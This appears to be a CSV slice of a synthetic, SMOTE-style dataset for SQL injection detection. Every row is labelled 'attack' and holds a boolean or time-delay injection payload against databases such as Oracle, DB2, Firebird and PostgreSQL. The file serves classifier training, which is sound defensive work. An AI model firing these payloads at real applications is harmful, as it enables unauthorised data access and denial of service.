id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000415,attack,boolean,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,nearest_attack_euclidean,R000494,0.05233820318905437
SMOTE_000416,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R001179,0.017671064338455444
SMOTE_000417,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001178,0.5075804746980728
SMOTE_000418,attack,boolean,1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--,nearest_attack_euclidean,R000082,0.4690266258675981
SMOTE_000419,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000454,0.2605391410514143
SMOTE_000420,attack,boolean,"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",nearest_attack_euclidean,R001502,0.8572287918322019
SMOTE_000421,attack,boolean,1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +',nearest_attack_euclidean,R000975,0.5088165680969341
SMOTE_000422,attack,boolean,1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,nearest_attack_euclidean,R001095,0.050767023439950806
SMOTE_000423,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R001252,0.12561207467421684
SMOTE_000424,attack,boolean,-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R001534,0.31906184094914364
SMOTE_000425,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000841,0.14415447183915775
SMOTE_000426,attack,boolean,"1'||  (  select 'fmss' from dual where 7025  =  7025 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R001122,0.25148834021920635
SMOTE_000427,attack,boolean,"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R001136,0.7101688728688431
SMOTE_000428,attack,boolean,-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000202,0.4365197939838366
SMOTE_000429,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'cqrp'  =  'cqrp",nearest_attack_euclidean,R001344,0.3801110286765354
SMOTE_000430,attack,boolean,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",nearest_attack_euclidean,R000328,0.16036737573034188
SMOTE_000431,attack,boolean,"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl",nearest_attack_euclidean,R001420,0.33674052300975144
SMOTE_000432,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",nearest_attack_euclidean,R001165,0.21535761031533676
SMOTE_000433,attack,boolean,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",nearest_attack_euclidean,R000243,0.0562568070118567
SMOTE_000434,attack,boolean,"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001514,0.3747443879797948
SMOTE_000435,attack,boolean,"-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip",nearest_attack_euclidean,R000853,0.0019418704761548198
SMOTE_000436,attack,boolean,"1%""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R001272,0.6263799187694195
SMOTE_000437,attack,boolean,"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001357,0.17938779084055378
SMOTE_000438,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bkag'  =  'bkag",nearest_attack_euclidean,R000225,0.0025470332587399073
SMOTE_000439,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001178,0.1361638531953286
SMOTE_000440,attack,boolean,"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000153,0.0049852773551250186
SMOTE_000441,attack,boolean,"-5211""   )    )    as bkvr where 4082  =  4082 or 2323  =  8052",nearest_attack_euclidean,R001393,1.0290073879033617
SMOTE_000442,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001083,0.10343590643352166
SMOTE_000443,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",nearest_attack_euclidean,R000155,0.26561837182584125
SMOTE_000444,attack,boolean,"1""  )   as idwa where 2545  =  2545 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000298,0.08608178170223446
SMOTE_000445,attack,boolean,"1'   )    )    as rxhe where 3838  =  3838 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000338,0.20029672078970293
SMOTE_000446,attack,boolean,"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000537,0.14921608215071105
SMOTE_000447,attack,boolean,"-6534%'   )    )    or make_set  (  4107  =  9457,9457  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000640,0.30937345797543087
SMOTE_000448,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000162,0.22149575361055565
SMOTE_000449,attack,boolean,"-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz",nearest_attack_euclidean,R001476,0.4293543143278925
SMOTE_000450,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000255,0.15061527131029695
SMOTE_000451,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001386,0.38700525571489724
SMOTE_000452,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R001200,1.2950541446998494
SMOTE_000453,attack,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000019,0.15674032842130373
SMOTE_000454,attack,boolean,"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000246,0.07862001571447226
SMOTE_000455,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R001332,0.06774869588520988
SMOTE_000456,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",nearest_attack_euclidean,R000380,0.35948970328095337
SMOTE_000457,attack,boolean,"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr",nearest_attack_euclidean,R000311,0.16425373132922988
SMOTE_000458,attack,boolean,"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """,nearest_attack_euclidean,R001347,0.2452767314755544
SMOTE_000459,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000973,0.5889173544881463
SMOTE_000460,attack,boolean,"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",nearest_attack_euclidean,R001368,0.04965404415637623
SMOTE_000461,attack,boolean,"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""xqgt"" like ""xqgt",nearest_attack_euclidean,R001159,0.272455269878059
SMOTE_000462,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000001,0.0
SMOTE_000463,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",nearest_attack_euclidean,R000902,0.0637779455799381
SMOTE_000464,attack,boolean,"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000261,0.6610945149585699
SMOTE_000465,attack,boolean,"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000158,1.1647831653332295
SMOTE_000466,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R001031,0.6556981659663461
SMOTE_000467,attack,boolean,"-9698  )   as pvhn where 3223  =  3223 or elt  (  6563  =  9210,9210  )  --",nearest_attack_euclidean,R001283,0.47493825579989657
SMOTE_000468,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",nearest_attack_euclidean,R000461,0.6069980875337304
SMOTE_000469,attack,boolean,"1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000931,0.033643665892675936
SMOTE_000470,attack,boolean,"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001288,0.07600621720095835
SMOTE_000471,attack,boolean,1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,nearest_attack_euclidean,R001346,0.20287213941225185
SMOTE_000472,attack,boolean,"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001432,0.9804807938047659
SMOTE_000473,attack,boolean,"1'||  (  select 'cjwx' from dual where 7637  =  7637 and elt  (  9548  =  3991,3991   )    )   ||'",nearest_attack_euclidean,R000478,0.2561586362590693
SMOTE_000474,attack,boolean,"-9944""   )    )    or 8537  =  2039 and    (    (   ""kfzj""  =  ""kfzj",nearest_attack_euclidean,R000417,0.557114601727657
SMOTE_000475,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001253,0.07520882909458022
SMOTE_000476,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001467,0.3001604263317854
SMOTE_000477,attack,boolean,"1%'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001506,0.8667765071277298
SMOTE_000478,attack,boolean,"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000613,0.5262531402225659
SMOTE_000479,attack,boolean,"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000354,0.8874194860552843
SMOTE_000480,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""eboa"" like ""eboa",nearest_attack_euclidean,R001549,0.2931916289619743
SMOTE_000481,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000022,1.9504305427402457
SMOTE_000482,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",nearest_attack_euclidean,R000949,1.4939735076532069e-05
SMOTE_000483,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000195,0.9670597622612441
SMOTE_000484,attack,boolean,"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""giuq""  =  ""giuq",nearest_attack_euclidean,R001458,0.364218419995913
SMOTE_000485,attack,boolean,1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,nearest_attack_euclidean,R001346,0.16537298234641348
SMOTE_000486,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000344,0.8788000722648582
SMOTE_000487,attack,boolean,"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",nearest_attack_euclidean,R000169,0.20624674241523655
SMOTE_000488,attack,boolean,"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000193,0.09392207914009224
SMOTE_000489,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",nearest_attack_euclidean,R000161,0.4576112603684054
SMOTE_000490,attack,boolean,"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000081,0.25445985317110487
SMOTE_000491,attack,boolean,"1""  )   where 6956  =  6956 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000385,0.0573194863105689
SMOTE_000492,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",nearest_attack_euclidean,R001281,0.22323077063159175
SMOTE_000493,attack,boolean,"-7851""   )    )    or 6872  =  6872 and    (    (   ""dvbw"" like ""dvbw",nearest_attack_euclidean,R001459,0.4484552587638629
SMOTE_000494,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000308,0.19415353638991623
SMOTE_000495,attack,boolean,"1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000807,0.43708337012637927
SMOTE_000496,attack,boolean,"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000354,0.8357385052290764
SMOTE_000497,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R001536,0.23742565243174082
SMOTE_000498,attack,boolean,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",nearest_attack_euclidean,R001151,0.7186247124993601
SMOTE_000499,attack,boolean,"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001055,0.111621094780133
SMOTE_000500,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001130,0.048253699310705694
